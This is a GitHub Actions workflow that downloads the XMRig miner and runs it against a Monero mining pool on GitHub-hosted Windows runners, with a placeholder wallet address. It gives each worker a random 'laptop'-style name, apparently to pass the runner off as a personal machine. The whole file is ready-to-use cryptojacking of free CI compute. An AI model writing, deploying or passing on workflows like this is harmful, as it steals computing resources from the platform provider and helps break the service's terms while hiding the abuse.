name: Windows XMRig Miner (Fixed)

on:
  workflow_dispatch:

jobs:
  mine:
    runs-on: windows-latest
    timeout-minutes: 30
    steps:
      - name: Generate random worker name
        id: worker
        run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append

      - name: Download pre-built XMRig
        run: |
          mkdir -p $env:USERPROFILE\miner
          cd $env:USERPROFILE\miner
          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
          Expand-Archive -Path "xmrig.zip" -DestinationPath .
          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"

      - name: Run XMRig (fixed syntax)
        run: |
          cd $env:USERPROFILE\miner\xmrig
          .\xmrig.exe -o pool.supportxmr.com:3333 `
            -u YOUR_VALID_MONERO_ADDRESS_HERE `
            -p ${{ steps.worker.outputs.name }} `
            -k --donate-level 1 -t 4
